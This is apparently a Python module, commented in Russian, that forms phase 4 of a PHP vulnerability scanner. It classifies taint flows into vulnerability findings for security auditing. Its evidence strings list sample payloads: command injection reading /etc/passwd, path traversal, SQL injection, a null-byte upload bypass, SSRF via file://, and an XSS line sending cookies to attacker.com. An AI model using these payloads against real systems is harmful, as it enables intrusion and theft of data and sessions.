#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Фаза 4: Анализ эксплуатируемости
Анализирует оставшиеся потоки на предмет реальной эксплуатируемости
"""

import os
import json
import yaml
from typing import List, Dict, Any, Optional
from dataclasses import dataclass, asdict


@dataclass
class Vulnerability:
    """Подтверждённая уязвимость"""
    entrypoint: str
    parameter: str
    vulnerability_class: str
    sink_function: str
    sink_type: str
    sink_line: int
    exploitation_condition: str
    observable_impact: str
    proof_evidence: List[str]
    user_control: str
    transformations: List[str]
    severity: str  # CRITICAL, HIGH, MEDIUM, LOW
    confidence: str  # HIGH, MEDIUM, LOW


class ExploitabilityAnalyzer:
    """Анализатор эксплуатируемости"""
    
    def __init__(self, config_path: str, filtered_flows_path: str):
        with open(config_path, 'r', encoding='utf-8') as f:
            self.config = yaml.safe_load(f)
        
        with open(filtered_flows_path, 'r', encoding='utf-8') as f:
            self.filtered_data = json.load(f)
        
        self.vulnerabilities: List[Vulnerability] = []
        
        # Маппинг типов стоков на классы уязвимостей
        self.sink_to_vuln_class = {
            'sql': 'SQL Injection',
            'command': 'Command Injection',
            'file': 'Path Traversal / File Inclusion',
            'code_exec': 'Code Execution',
            'output': 'Cross-Site Scripting (XSS)',
            'upload': 'Insecure File Upload',
            'network': 'Server-Side Request Forgery (SSRF)'
        }
    
    def analyze_exploitability(self):
        """Анализировать эксплуатируемость потоков"""
        print("[ФАЗА 4] Начало анализа эксплуатируемости...")
        
        flows = self.filtered_data['filtered_flows']
        total = len(flows)
        
        for idx, flow in enumerate(flows, 1):
            print(f"  [{idx}/{total}] Анализ {flow['entrypoint']} -> {flow['parameter']}...")
            vuln = self._analyze_flow(flow)
            if vuln:
                self.vulnerabilities.append(vuln)
        
        print(f"[ФАЗА 4] Найдено уязвимостей: {len(self.vulnerabilities)}")
        return self.vulnerabilities
    
    def _analyze_flow(self, flow: Dict) -> Optional[Vulnerability]:
        """Анализировать один поток на эксплуатируемость"""
        
        sink_type = flow['sink_type']
        sink_func = flow['sink']
        
        # Определить класс уязвимости
        vuln_class = self.sink_to_vuln_class.get(sink_type, 'Unknown')
        
        # Анализировать в зависимости от типа стока
        if sink_type == 'sql':
            return self._analyze_sql_injection(flow, vuln_class)
        elif sink_type == 'command':
            return self._analyze_command_injection(flow, vuln_class)
        elif sink_type == 'file':
            return self._analyze_file_vulnerability(flow, vuln_class)
        elif sink_type == 'code_exec':
            return self._analyze_code_execution(flow, vuln_class)
        elif sink_type == 'output':
            return self._analyze_xss(flow, vuln_class)
        elif sink_type == 'upload':
            return self._analyze_file_upload(flow, vuln_class)
        elif sink_type == 'network':
            return self._analyze_ssrf(flow, vuln_class)
        
        return None
    
    def _analyze_sql_injection(self, flow: Dict, vuln_class: str) -> Optional[Vulnerability]:
        """Анализировать SQL Injection"""
        
        # Проверить трансформации
        has_escape = any(
            'escape' in t['function'].lower() or 'prepare' in t['function'].lower()
            for t in flow['transformations']
        )
        
        # Если есть правильная санитизация через prepared statements или escape
        if flow['user_control_preserved'] == 'NO' or has_escape:
            return None
        
        # Определить условие эксплуатации
        exploitation_condition = "Пользовательский ввод напрямую конкатенируется в SQL-запрос без санитизации"
        
        # Наблюдаемое воздействие
        observable_impact = "Выполнение произвольных SQL-команд, чтение/модификация базы данных"
        
        # Доказательства
        proof_evidence = [
            "SQL-ошибка в ответе при отправке символа ' (одиночная кавычка)",
            "Изменение логики запроса через условие OR 1=1",
            "Извлечение данных через UNION SELECT",
            "Логи базы данных, показывающие модифицированный запрос"
        ]
        
        # Определить серьёзность
        severity = self._determine_severity(flow, 'CRITICAL')
        
        return Vulnerability(
            entrypoint=flow['entrypoint'],
            parameter=flow['parameter'],
            vulnerability_class=vuln_class,
            sink_function=flow['sink'],
            sink_type=flow['sink_type'],
            sink_line=flow['sink_line'],
            exploitation_condition=exploitation_condition,
            observable_impact=observable_impact,
            proof_evidence=proof_evidence,
            user_control=flow['user_control_preserved'],
            transformations=[t['function'] for t in flow['transformations']],
            severity=severity,
            confidence='HIGH'
        )
    
    def _analyze_command_injection(self, flow: Dict, vuln_class: str) -> Optional[Vulnerability]:
        """Анализировать Command Injection"""
        
        # Проверить санитизацию
        has_escape = any(
            'escapeshell' in t['function'].lower()
            for t in flow['transformations']
        )
        
        if flow['user_control_preserved'] == 'NO' or has_escape:
            return None
        
        exploitation_condition = "Пользовательский ввод передаётся в функцию выполнения команд без санитизации"
        observable_impact = "Выполнение произвольных команд операционной системы"
        proof_evidence = [
            "Выполнение команды whoami через инъекцию ;whoami",
            "Вывод /etc/passwd через инъекцию ;cat /etc/passwd",
            "Создание файла через инъекцию ;touch /tmp/pwned",
            "Логи системы, показывающие выполнение команды"
        ]
        
        severity = 'CRITICAL'
        
        return Vulnerability(
            entrypoint=flow['entrypoint'],
            parameter=flow['parameter'],
            vulnerability_class=vuln_class,
            sink_function=flow['sink'],
            sink_type=flow['sink_type'],
            sink_line=flow['sink_line'],
            exploitation_condition=exploitation_condition,
            observable_impact=observable_impact,
            proof_evidence=proof_evidence,
            user_control=flow['user_control_preserved'],
            transformations=[t['function'] for t in flow['transformations']],
            severity=severity,
            confidence='HIGH'
        )
    
    def _analyze_file_vulnerability(self, flow: Dict, vuln_class: str) -> Optional[Vulnerability]:
        """Анализировать File-related уязвимости"""
        
        sink_func = flow['sink']
        
        # Уточнить класс уязвимости
        if 'include' in sink_func or 'require' in sink_func:
            vuln_class = 'Local File Inclusion'
            exploitation_condition = "Пользовательский ввод используется в include/require без валидации"
            observable_impact = "Включение произвольных файлов, возможное выполнение кода"
            proof_evidence = [
                "Включение /etc/passwd через path traversal (../../etc/passwd)",
                "Выполнение PHP-кода через включение загруженного файла",
                "Раскрытие исходного кода через включение .php файлов",
                "Логи показывают включение неожиданного файла"
            ]
            severity = 'CRITICAL'
        elif sink_func in ['file_get_contents', 'fopen']:
            vuln_class = 'Path Traversal'
            exploitation_condition = "Пользовательский ввод используется в операциях чтения файла"
            observable_impact = "Чтение произвольных файлов системы"
            proof_evidence = [
                "Чтение /etc/passwd через path traversal",
                "Раскрытие файлов конфигурации (config.php)",
                "Чтение логов через ../../../",
                "Содержимое файла в HTTP-ответе"
            ]
            severity = 'HIGH'
        elif sink_func in ['file_put_contents', 'fwrite']:
            vuln_class = 'Arbitrary File Write'
            exploitation_condition = "Пользовательский ввод контролирует путь или содержимое записываемого файла"
            observable_impact = "Запись произвольных файлов, возможная загрузка веб-шелла"
            proof_evidence = [
                "Создание PHP-файла с кодом через запись",
                "Перезапись .htaccess для обхода защиты",
                "Запись файла в веб-директорию",
                "Файл существует в файловой системе после запроса"
            ]
            severity = 'CRITICAL'
        else:
            exploitation_condition = "Пользовательский ввод влияет на файловые операции"
            observable_impact = "Манипуляция с файловой системой"
            proof_evidence = [
                "Изменение файловой системы",
                "Неожиданное поведение файловых операций"
            ]
            severity = 'MEDIUM'
        
        return Vulnerability(
            entrypoint=flow['entrypoint'],
            parameter=flow['parameter'],
            vulnerability_class=vuln_class,
            sink_function=flow['sink'],
            sink_type=flow['sink_type'],
            sink_line=flow['sink_line'],
            exploitation_condition=exploitation_condition,
            observable_impact=observable_impact,
            proof_evidence=proof_evidence,
            user_control=flow['user_control_preserved'],
            transformations=[t['function'] for t in flow['transformations']],
            severity=severity,
            confidence='HIGH'
        )
    
    def _analyze_code_execution(self, flow: Dict, vuln_class: str) -> Optional[Vulnerability]:
        """Анализировать Code Execution"""
        
        exploitation_condition = "Пользовательский ввод передаётся в функцию выполнения кода"
        observable_impact = "Выполнение произвольного PHP-кода на сервере"
        proof_evidence = [
            "Выполнение phpinfo() через инъекцию",
            "Создание файла через file_put_contents в eval",
            "Вывод system() команд",
            "Изменение переменных сервера"
        ]
        
        return Vulnerability(
            entrypoint=flow['entrypoint'],
            parameter=flow['parameter'],
            vulnerability_class=vuln_class,
            sink_function=flow['sink'],
            sink_type=flow['sink_type'],
            sink_line=flow['sink_line'],
            exploitation_condition=exploitation_condition,
            observable_impact=observable_impact,
            proof_evidence=proof_evidence,
            user_control=flow['user_control_preserved'],
            transformations=[t['function'] for t in flow['transformations']],
            severity='CRITICAL',
            confidence='HIGH'
        )
    
    def _analyze_xss(self, flow: Dict, vuln_class: str) -> Optional[Vulnerability]:
        """Анализировать XSS"""
        
        # Проверить HTML-санитизацию
        has_html_encoding = any(
            'htmlspecialchars' in t['function'] or 'htmlentities' in t['function']
            for t in flow['transformations']
        )
        
        if has_html_encoding:
            # Если есть правильное кодирование, это не эксплуатируемо
            return None
        
        exploitation_condition = "Пользовательский ввод выводится в HTML без кодирования"
        observable_impact = "Выполнение JavaScript-кода в браузере пользователя"
        proof_evidence = [
            "Выполнение alert() через <script>alert(1)</script>",
            "Кража cookie через <script>fetch('http://attacker.com/?c='+document.cookie)</script>",
            "Отображение инъецированного HTML в странице",
            "JavaScript-ошибки или выполнение в консоли браузера"
        ]
        
        # XSS обычно HIGH, если не в admin-контексте
        severity = 'HIGH'
        
        return Vulnerability(
            entrypoint=flow['entrypoint'],
            parameter=flow['parameter'],
            vulnerability_class=vuln_class,
            sink_function=flow['sink'],
            sink_type=flow['sink_type'],
            sink_line=flow['sink_line'],
            exploitation_condition=exploitation_condition,
            observable_impact=observable_impact,
            proof_evidence=proof_evidence,
            user_control=flow['user_control_preserved'],
            transformations=[t['function'] for t in flow['transformations']],
            severity=severity,
            confidence='HIGH'
        )
    
    def _analyze_file_upload(self, flow: Dict, vuln_class: str) -> Optional[Vulnerability]:
        """Анализировать File Upload"""
        
        exploitation_condition = "Загрузка файла без валидации типа или содержимого"
        observable_impact = "Загрузка и выполнение веб-шелла (PHP backdoor)"
        proof_evidence = [
            "Загрузка .php файла через переименование",
            "Загрузка двойного расширения (shell.php.jpg)",
            "Обход проверки через null-byte (shell.php%00.jpg)",
            "Доступ к загруженному PHP-файлу через HTTP приводит к выполнению кода"
        ]
        
        return Vulnerability(
            entrypoint=flow['entrypoint'],
            parameter=flow['parameter'],
            vulnerability_class=vuln_class,
            sink_function=flow['sink'],
            sink_type=flow['sink_type'],
            sink_line=flow['sink_line'],
            exploitation_condition=exploitation_condition,
            observable_impact=observable_impact,
            proof_evidence=proof_evidence,
            user_control=flow['user_control_preserved'],
            transformations=[t['function'] for t in flow['transformations']],
            severity='CRITICAL',
            confidence='MEDIUM'
        )
    
    def _analyze_ssrf(self, flow: Dict, vuln_class: str) -> Optional[Vulnerability]:
        """Анализировать SSRF"""
        
        exploitation_condition = "Пользовательский ввод контролирует URL в сетевом запросе"
        observable_impact = "Доступ к внутренним ресурсам, сканирование портов, SSRF-атаки"
        proof_evidence = [
            "Доступ к http://localhost через SSRF",
            "Чтение file:// протокола (file:///etc/passwd)",
            "Сканирование внутренних портов",
            "Ответ содержит данные из внутреннего ресурса"
        ]
        
        return Vulnerability(
            entrypoint=flow['entrypoint'],
            parameter=flow['parameter'],
            vulnerability_class=vuln_class,
            sink_function=flow['sink'],
            sink_type=flow['sink_type'],
            sink_line=flow['sink_line'],
            exploitation_condition=exploitation_condition,
            observable_impact=observable_impact,
            proof_evidence=proof_evidence,
            user_control=flow['user_control_preserved'],
            transformations=[t['function'] for t in flow['transformations']],
            severity='HIGH',
            confidence='MEDIUM'
        )
    
    def _determine_severity(self, flow: Dict, default: str) -> str:
        """Определить серьёзность уязвимости"""
        # Можно добавить дополнительную логику на основе контекста
        return default
    
    def save_results(self, output_path: str):
        """Сохранить результаты"""
        results = {
            "total_vulnerabilities": len(self.vulnerabilities),
            "vulnerabilities": [asdict(v) for v in self.vulnerabilities]
        }
        
        with open(output_path, 'w', encoding='utf-8') as f:
            json.dump(results, f, indent=2, ensure_ascii=False)
        
        print(f"[ФАЗА 4] Результаты сохранены в {output_path}")


def main():
    import argparse
    
    parser = argparse.ArgumentParser(
        description='Фаза 4: Анализ эксплуатируемости'
    )
    parser.add_argument(
        '--config',
        default='config.yaml',
        help='Путь к файлу конфигурации'
    )
    parser.add_argument(
        '--filtered',
        default='results/filtered_flows.json',
        help='Путь к результатам фазы 3'
    )
    parser.add_argument(
        '--output',
        default='results/vulnerabilities.json',
        help='Путь для сохранения результатов'
    )
    
    args = parser.parse_args()
    
    # Создать директорию для результатов
    os.makedirs(os.path.dirname(args.output), exist_ok=True)
    
    # Запустить анализ
    analyzer = ExploitabilityAnalyzer(args.config, args.filtered)
    vulns = analyzer.analyze_exploitability()
    analyzer.save_results(args.output)
    
    print(f"\n[ФАЗА 4] Завершено. Найдено уязвимостей: {len(vulns)}")


if __name__ == "__main__":
    main()
